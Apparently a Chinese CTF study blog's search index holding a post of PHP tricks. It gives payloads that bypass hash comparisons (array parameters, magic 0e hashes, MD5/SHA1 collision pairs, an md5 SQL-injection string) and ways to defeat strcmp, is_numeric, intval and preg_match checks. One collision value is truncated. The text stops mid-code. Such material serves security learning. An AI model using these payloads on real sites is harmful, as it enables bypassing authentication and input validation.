<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP tricks</title>
    <link href="/2023/10/28/PHP_tricks/"/>
    <url>/2023/10/28/PHP_tricks/</url>
    
    <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h3 id="数组绕过强比较"><a href="#数组绕过强比较" class="headerlink" title="数组绕过强比较"></a>数组绕过强比较</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">md5($_POST[<span class="hljs-string">&#x27;key3&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;key3&#x27;</span>])<br></code></pre></td></tr></table></figure><p>payload:<code>key3[]=1</code></p><h3 id="0e绕过弱比较"><a href="#0e绕过弱比较" class="headerlink" title="0e绕过弱比较"></a>0e绕过弱比较</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">sha1($<span class="hljs-built_in">array</span>1) === sha1($<span class="hljs-built_in">array</span>2)<br></code></pre></td></tr></table></figure><p>payload: <code>qw[]=10932435112&amp;yxx[]=aaroZmOk</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs llvm">md<span class="hljs-number">5</span><br><span class="hljs-number">240610708</span>:<span class="hljs-number">0e462097431906509019562988736854</span><br>QLTHNDT:<span class="hljs-number">0e405967825401955372549139051580</span><br>QNKCDZO:<span class="hljs-number">0e830400451993494058024219903391</span><br>PJNPDWY:<span class="hljs-number">0e291529052894702774557631701704</span><br>NWWKITQ:<span class="hljs-number">0e763082070976038347657360817689</span><br>NOOPCJF:<span class="hljs-number">0e818888003657176127862245791911</span><br>MMHUWUV:<span class="hljs-number">0e701732711630150438129209816536</span><br>MAUXXQC:<span class="hljs-number">0e478478466848439040434801845361</span><br><br>sha<span class="hljs-number">1</span><br><span class="hljs-number">10932435112</span>: <span class="hljs-number">0e07766915004133176347055865026311692244</span><br>aaroZmOk: <span class="hljs-number">0e66507019969427134894567494305185566735</span><br>aaK<span class="hljs-number">1</span>STfY: <span class="hljs-number">0e76658526655756207688271159624026011393</span><br>aaO<span class="hljs-number">8</span>zKZF: <span class="hljs-number">0e89257456677279068558073954252716165668</span><br>aa<span class="hljs-number">3</span>OFF<span class="hljs-number">9</span>m: <span class="hljs-number">0e36977786278517984959260394024281014729</span><br><span class="hljs-number">0e1290633704</span>: <span class="hljs-number">0e19985187802402577070739524195726831799</span><br><br>双重md<span class="hljs-number">5</span><br><span class="hljs-number">7</span>r<span class="hljs-number">4</span>lGXCH<span class="hljs-number">2</span>Ksu<span class="hljs-number">2</span>JNT<span class="hljs-number">3</span>BYM<br>CbDLytmyGm<span class="hljs-number">2</span>xQyaLNhWn<br><span class="hljs-number">770</span>hQgrBOjrcqftrlaZk<br><br>$a<span class="hljs-operator">=</span><span class="hljs-operator">=</span>md<span class="hljs-number">5</span>($a)<br><span class="hljs-number">0e215962017</span><br><br>md<span class="hljs-number">5</span>绕过SQL<br>ffifdyop，经过md<span class="hljs-number">5</span>函数后结果为 &#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">6</span>\xc<span class="hljs-number">9</span>]\<span class="hljs-keyword">x</span><span class="hljs-number">99</span>\xe<span class="hljs-number">9</span><span class="hljs-title">!r</span><span class="hljs-punctuation">,</span>\xf<span class="hljs-number">9</span>\xedb\<span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span>；<br><span class="hljs-number">129581926211651571912466741651878684928</span>，经过md<span class="hljs-number">5</span>函数后结果为 \<span class="hljs-keyword">x</span><span class="hljs-number">06</span>\xdaT<span class="hljs-number">0</span>D\<span class="hljs-keyword">x</span><span class="hljs-number">9</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">8</span>fo#\xdf\xc<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">8</span>；<br><br>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是<span class="hljs-keyword">double</span>，那么在md<span class="hljs-number">5</span>函数处理它们的时候，<br>是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了<span class="hljs-keyword">true</span>）<br>做强类型或弱类型比较均为<span class="hljs-keyword">false</span>，甚至NAN<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>NAN都是<span class="hljs-keyword">false</span>，但md<span class="hljs-number">5</span>(&#x27;NaN&#x27;)<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>md<span class="hljs-number">5</span>(&#x27;NaN&#x27;)为<span class="hljs-keyword">true</span>。<br><br>md<span class="hljs-number">5</span>碰撞，sha<span class="hljs-number">1</span>碰撞<br>使用碰撞可以绕过不同字符串，相同md<span class="hljs-number">5</span>/sha<span class="hljs-number">1</span>的强比较<br>MD<span class="hljs-number">5</span>碰撞：<br><span class="hljs-symbol">url:</span><br>两组经过url编码后的值，<br><span class="hljs-variable">#1</span><br>a<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>   <br>b<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>   <br><span class="hljs-variable">#2</span><br>a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>   <br>b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span>%<br><span class="hljs-variable">#3</span><br>$a<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span><span class="hljs-comment">;</span><br>$b<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>文件：<br>linux使用md<span class="hljs-number">5</span>collgen碰撞生成两个md<span class="hljs-number">5</span>值相同但内容不同的文件<br>md<span class="hljs-number">5</span>collgen -o <span class="hljs-number">1</span>.bin <span class="hljs-number">2</span>.bin<br>windows可以下载fastcoll，碰撞生成两个md<span class="hljs-number">5</span>值相同但内容不同的文件<br>fastcoll.exe -p <span class="hljs-number">123</span>.txt -o <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br><br>sha<span class="hljs-number">1</span>碰撞：<br>url：<br>a<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span><br>b<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br><br><br></code></pre></td></tr></table></figure><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p>如果比较的是数组的话，直接返回一个0。</p><p><code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0</code>中<code>file_get_contents(&quot;/flag&quot;)</code>的值是字符串</p><p>payload：<code>key4[]=1</code></p><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h3><p><code>is_numeric</code>函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">!<span class="hljs-built_in">is_numeric</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;key5&#x27;</span>]</span>) &amp;&amp; $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;key5&#x27;</span>]</span> &gt; <span class="hljs-number">2023</span><br></code></pre></td></tr></table></figure><p>payload：<code>key5=2024%00</code></p><p>我们可以变成判断条件绕过 即 <code>key5=2024|2024</code></p><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>GET接收num传参，num要小于2020，加1之后要大于2021，否则要么die，要么还是die<br>随后查询intval()函数的使用方式，如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值；但是如果先科学计数法+数字，此时会先将科学计数法变为正常的数再进行加法运算，之后才传入intval()进行转换。</p><p>注意：该方法只有php5才生效?num&#x3D;2e4</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="_过滤"></a>_过滤</h3><p>PHP中<code>_</code>可以用<code>[</code>替代</p><p><img src="/2023/10/28/PHP_tricks/image-20231028151956001.png" alt="image-20231028151956001"></p><h3 id="pre-match"><a href="#pre-match" class="headerlink" title="pre_match"></a>pre_match</h3><p>函数处理的字符长度限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jiuzhe</span>(<span class="hljs-params"><span class="hljs-variable">$xdmtql</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys.*nb/is&#x27;</span>,<span class="hljs-variable">$xdmtql</span>);<br>&#125;<br><br><span class="hljs-variable">$xdmtql</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xdmtql&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span 